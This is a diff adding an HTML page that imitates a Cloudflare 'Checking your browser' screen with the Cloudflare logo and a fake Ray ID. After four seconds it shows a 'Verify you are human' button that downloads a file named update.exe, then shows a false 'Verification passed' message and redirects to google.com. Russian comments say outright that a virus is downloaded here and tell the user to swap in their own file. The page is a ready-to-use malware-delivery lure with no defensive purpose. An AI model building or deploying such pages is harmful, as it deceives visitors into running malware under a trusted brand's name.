@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Just a moment...</title>
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            max-width: 600px;
+            padding: 20px;
+        }
+        .logo {
+            width: 250px;
+            margin-bottom: 30px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #000;
+        }
+        h2 {
+            font-size: 16px;
+            font-weight: 400;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .loader {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #F38020; /* Cloudflare оранжевый */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .btn {
+            display: none;
+            background-color: #0051c3;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .btn:hover {
+            background-color: #003a8c;
+        }
+        .footer {
+            margin-top: 50px;
+            font-size: 12px;
+            color: #999;
+        }
+        .footer a {
+            color: #999;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Логотип Cloudflare -->
+    <svg class="logo" viewBox="0 0 250 50" xmlns="http://www.w3.org/2000/svg">
+        <path d="M245.3 22.9c-1.3-3.6-4.4-5.7-8.4-5.7h-1c-0.4-4.1-3.6-7.4-7.8-7.4h-2.2c-1.3 0-2.5 0.4-3.6 1.2-1.3-1.9-3.4-3.2-5.8-3.2h-1.1c-3.1 0-5.8 2-6.7 4.9-2.1 0.4-3.9 2.1-4.3 4.3h-1.2c-3.5 0-6.4 2.9-6.4 6.4 0 3.5 2.9 6.4 6.4 6.4h41.7c2.7 0 5-2.2 5-5 0-2-1.2-3.8-3-4.5z" fill="#F38020"/>
+        <path d="M213.3 20.2c-0.1 0-0.2 0-0.3 0-0.1-0.4-0.4-0.8-0.8-0.8-0.4 0-0.8 0.3-0.8 0.8 0 0.1 0 0.1 0 0.2-0.4 0-0.7 0.3-0.7 0.7 0 0.4 0.3 0.7 0.7 0.7h1.9c0.4 0 0.7-0.3 0.7-0.7 0-0.3-0.3-0.7-0.7-0.7z" fill="#FFF"/>
+    </svg>
+
+    <h1>Checking your browser before accessing the site.</h1>
+    <h2>This process is automatic. Your browser will redirect to your requested content shortly.</h2>
+    
+    <div class="loader" id="loader"></div>
+    
+    <!-- Сюда скачивается вирус и перекидываем на сайт -->
+    <button class="btn" id="verifyBtn" onclick="startDownload()">Verify you are human</button>
+
+    <div class="footer">
+        Performance & security by <a href="#">Cloudflare</a><br>
+        Ray ID: 8a2b3c4d5e6f7g8h
+    </div>
+</div>
+
+<script>
+    // Через 4 секунды показываем кнопку и скрываем лоадер
+    setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('verifyBtn').style.display = 'inline-block';
+        document.querySelector('h1').innerText = "Verification Required";
+        document.querySelector('h2').innerText = "Please click the button below to verify you are human and continue.";
+    }, 4000);
+
+    function startDownload() {
+        // 1. Скачиваем файл (Замени 'update.exe' на свой файл)
+        window.location.href = "update.exe";
+        
+        // 2. Меняем текст на "Проверка пройдена"
+        document.getElementById('verifyBtn').innerText = "Verification passed. Redirecting...";
+        document.getElementById('verifyBtn').style.backgroundColor = "#008000";
+        
+        // 3. Через 2 секунды перекидываем на google.com (или любой другой сайт)
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 2000);
+    }
+</script>
+
+</body>
+</html>
